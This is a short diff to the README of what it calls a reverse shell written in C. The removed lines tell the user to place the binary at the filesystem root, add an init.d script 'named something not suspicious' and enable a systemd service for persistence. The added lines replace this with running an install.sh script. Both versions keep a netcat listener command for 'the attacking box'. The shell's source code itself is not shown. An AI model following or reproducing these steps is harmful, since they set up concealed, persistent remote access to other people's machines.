@@ -3,10 +3,8 @@
 A reverse shell written in c
 
 ## Installation and activation
-* First, download this in the / directory, compile a binary, then mv foo.exe /
-* Second, create a .sh file in /etc/init.d/ and name it something not suspicious. Use foo.sh as example
-* Then, in /etc/systemd/system create a .service file (example included). Use foo.service as example
-* $systemctl enable foo.service
+* Clone repository and add execute on install.sh
+* Run install.sh
 
 ## On the attacking box
 * $nc -nvlp 4444
